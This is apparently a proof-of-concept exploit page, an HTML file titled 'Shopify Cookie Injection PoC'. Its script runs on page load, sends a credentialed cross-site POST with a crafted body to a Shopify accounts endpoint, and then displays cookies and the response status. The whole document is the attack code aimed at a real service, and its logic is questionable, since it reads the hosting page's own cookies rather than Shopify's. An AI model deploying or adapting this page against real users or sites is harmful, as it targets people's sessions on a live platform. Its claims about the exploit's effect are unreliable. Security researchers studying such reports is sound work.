<!DOCTYPE html>
<html>
<body>
<h1>Shopify Cookie Injection PoC</h1>
<pre id="output">Running exploit...</pre>
<script>
(async () => {
    try {
        // Step 1 — Send the exact request body you saw in DevTools
        const res = await fetch("https://accounts.shopify.com/.well-known/dux", {
            method: "POST",
            credentials: "include", // send Shopify cookies
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "RenderableItem=%2Fshow%2F3%2Ffjnfjrtyj7qztrwnm0dvsberpybnvz"
        });

        // Step 2 — Wait for cookies to be set
        setTimeout(() => {
            const cookies = document.cookie;
            document.getElementById("output").textContent =
                "HTTP Status: " + res.status + "\n\n" +
                "Cookies for this domain:\n" + cookies;
        }, 500); // slight delay to ensure cookies are written
    } catch (err) {
        document.getElementById("output").textContent = "Error: " + err;
    }
})();
</script>
</body>
</html>
